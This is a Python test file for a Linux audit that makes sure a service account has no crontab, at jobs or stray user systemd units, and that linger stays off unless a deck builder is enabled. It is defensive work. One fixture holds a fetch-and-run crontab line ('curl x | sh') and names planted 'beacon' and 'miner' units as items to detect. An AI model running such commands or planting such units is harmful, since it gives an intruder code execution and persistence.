"""The resident schedules nothing of its own: no crontab, no at job, no user
unit outside the distribution's baseline, and linger only for the deck
builder.

Pins, on scratch files and stand-in probes (never the host's install):
  * the cron and at access rule (an allow file decides alone, else the deny
    file) and the audit's verdicts: a crontab is a FAIL, a missing deny line
    a WARN, a refused scheduler a PASS;
  * the user-unit check: unit files and their .wants links, what runs in
    the user manager's cgroup tree, the baseline and the deck scopes, and
    linger with and without the deck builder;
  * the root hardening step: it saves and removes a crontab, writes the deny
    lines (or drops the line from an allow file), and switches linger off
    only when the deck builder is not enabled.
"""
from __future__ import annotations

import importlib.util
import sys
import tempfile
from pathlib import Path

import pytest

pytestmark = pytest.mark.skipif(sys.platform == "darwin", reason="Linux-only audit")

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "preprocessor"))

_spec = importlib.util.spec_from_file_location("boundary_audit_sched",
                                               ROOT / "scripts" / "boundary-audit.py")
audit = importlib.util.module_from_spec(_spec)
sys.modules["boundary_audit_sched"] = audit
_spec.loader.exec_module(audit)

HARDEN = (ROOT / "deploy" / "harden-permissions.sh").read_text()
WHO = audit.Who(2 ** 31 - 7, frozenset({2 ** 31 - 7}))


def _ctx(tmp: Path, fstab_text: str = "") -> "audit.Ctx":
    fstab = tmp / "fstab"
    fstab.write_text(fstab_text)
    return audit.Ctx(ea_dir=tmp / "ea", private=tmp / "priv", owner_home=tmp / "owner",
                     owner_logs=tmp / "priv" / "logs", live_tree=tmp / "live", lanes_tree=None,
                     eabot_home=str(tmp / "ea-bot"), resident=WHO, repo=ROOT, fstab=fstab)


def _files(tmp: Path, cron_allow=None, cron_deny=None):
    out = {}
    for kind, allow, deny in (("cron", cron_allow, cron_deny), ("at", None, None)):
        a, d = tmp / f"{kind}.allow", tmp / f"{kind}.deny"
        if allow is not None:
            a.write_text(allow)
        if deny is not None:
            d.write_text(deny)
        out[kind] = (a, d)
    return out


# ── cron and at ───────────────────────────────────────────────────────

def test_the_access_rule():
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        assert audit.scheduler_allows("cron", _files(t)) is True
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        assert audit.scheduler_allows("cron", _files(t, cron_deny="root\nea-bot\n")) is False
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        # An allow file decides alone, whatever the deny file says.
        assert audit.scheduler_allows("cron", _files(t, cron_allow="crh\n", cron_deny="")) is False
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        assert audit.scheduler_allows("cron", _files(t, cron_allow="ea-bot\n",
                                                     cron_deny="ea-bot\n")) is True


def test_a_resident_crontab_fails():
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        r = audit.check_resident_cron(_ctx(t), probe=lambda: ("entries", ["* * * * * curl x | sh"]),
                                      files=_files(t, cron_deny="ea-bot\n"), kinds=["cron"])
        assert r[0]["status"] == "FAIL" and "1 job(s)" in r[0]["detail"]


def test_no_deny_line_warns_and_a_refusal_passes():
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        r = audit.check_resident_cron(_ctx(t), probe=lambda: ("none", []), files=_files(t),
                                      kinds=["cron", "at"])
        assert r[0]["status"] == "WARN" and "cron and at would accept" in r[0]["detail"]
        r = audit.check_resident_cron(_ctx(t), probe=lambda: ("denied", []),
                                      files=_files(t, cron_deny="ea-bot\n"), kinds=["cron"])
        assert r[0]["status"] == "PASS" and "cron refuse" in r[0]["detail"]
        r = audit.check_resident_cron(_ctx(t), probe=lambda: ("unknown", []),
                                      files=_files(t, cron_deny="ea-bot\n"), kinds=["cron"])
        assert r[0]["status"] == "WARN"


# ── user units and linger ─────────────────────────────────────────────

def _lister(tree: dict):
    def ls(path):
        return tree.get(path)
    return ls


def _cgroup(tmp: Path, uid: int, units: dict) -> Path:
    root = tmp / "cg"
    base = root / f"user-{uid}.slice" / f"user@{uid}.service"
    for sl, names in units.items():
        for n in names:
            (base / sl / n).mkdir(parents=True, exist_ok=True)
    (base / "init.scope").mkdir(parents=True, exist_ok=True)
    return root


def _linger(tmp: Path, on: bool) -> Path:
    d = tmp / ("linger-on" if on else "linger-off")
    d.mkdir(exist_ok=True)
    if on:
        (d / "ea-bot").write_text("")
    return d


def test_baseline_units_and_deck_linger_pass():
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        ctx = _ctx(t, "/x /srv/ea/presentations none bind,ro 0 0 # ea-deck-builder\n")
        top = f"{ctx.eabot_home}/.config/systemd/user"
        ls = _lister({top: [("d", "timers.target.wants")],
                      f"{top}/timers.target.wants": [("l", "snap.firmware-updater.timer")]})
        cg = _cgroup(t, WHO.uid, {"session.slice": ["pipewire.service", "dbus.service"],
                                  "app.slice": ["ea-deck-talk-1.scope", "gpg-agent.socket"]})
        r = audit.check_resident_units(ctx, lister=ls, cgroup_root=cg, linger_dir=_linger(t, True))
        assert r[0]["status"] == "PASS", r
        assert "deck builder needs it" in r[0]["detail"]


def test_a_planted_unit_file_or_running_unit_warns_by_name():
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        ctx = _ctx(t)
        top = f"{ctx.eabot_home}/.config/systemd/user"
        ls = _lister({top: [("f", "beacon.service"), ("d", "default.target.wants")],
                      f"{top}/default.target.wants": [("l", "beacon.service")]})
        cg = _cgroup(t, WHO.uid, {"app.slice": ["miner.service"]})
        r = audit.check_resident_units(ctx, lister=ls, cgroup_root=cg, linger_dir=_linger(t, False))
        assert r[0]["status"] == "WARN"
        assert "beacon.service" in r[0]["detail"] and "miner.service" in r[0]["detail"]


def test_linger_without_the_deck_builder_warns():
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        ctx = _ctx(t)
        r = audit.check_resident_units(ctx, lister=_lister({}), cgroup_root=t / "none",
                                       linger_dir=_linger(t, True))
        assert r[0]["status"] == "WARN" and "deck builder is not enabled" in r[0]["detail"]
        r = audit.check_resident_units(ctx, lister=_lister({}), cgroup_root=t / "none",
                                       linger_dir=_linger(t, False))
        assert r[0]["status"] == "PASS" and "linger off" in r[0]["detail"]


def test_both_checks_run_daily():
    assert audit.check_resident_cron in audit.CHECKS
    assert audit.check_resident_units in audit.CHECKS


# ── the root hardening step ───────────────────────────────────────────

def _step() -> str:
    i = HARDEN.index("ea-bot's own scheduling (cron, at, linger)")
    return HARDEN[i:HARDEN.index("ea-chat-bot drop-in (environment", i)]


def test_harden_saves_then_removes_a_resident_crontab():
    s = _step()
    assert "crontab -l -u ea-bot" in s
    assert s.index('> "$SAVED"') < s.index("crontab -r -u ea-bot")
    assert 'chmod 600 "$SAVED"' in s and '"$PRIV/ea-bot-crontab.removed.' in s


def test_harden_denies_cron_and_at_or_drops_an_allow_line():
    s = _step()
    assert "for kind in cron at" in s
    assert 'deny="/etc/$kind.deny"' in s and "echo 'ea-bot' >> \"$deny\"" in s
    assert "sed -i '/^ea-bot$/d' \"$allow\"" in s
    assert "grep -qx 'ea-bot'" in s


def test_harden_keeps_linger_only_for_the_deck_builder():
    s = _step()
    assert "grep -q '# ea-deck-builder' /etc/fstab" in s
    assert "loginctl disable-linger ea-bot" in s
    assert s.index("# ea-deck-builder") < s.index("loginctl disable-linger ea-bot")
    # The tag is the one enable-deck-builder.sh writes.
    deck = (ROOT / "deploy" / "enable-deck-builder.sh").read_text()
    assert 'FSTAB_TAG="# ea-deck-builder"' in deck
    assert audit.DECK_BUILDER_TAG == "# ea-deck-builder"
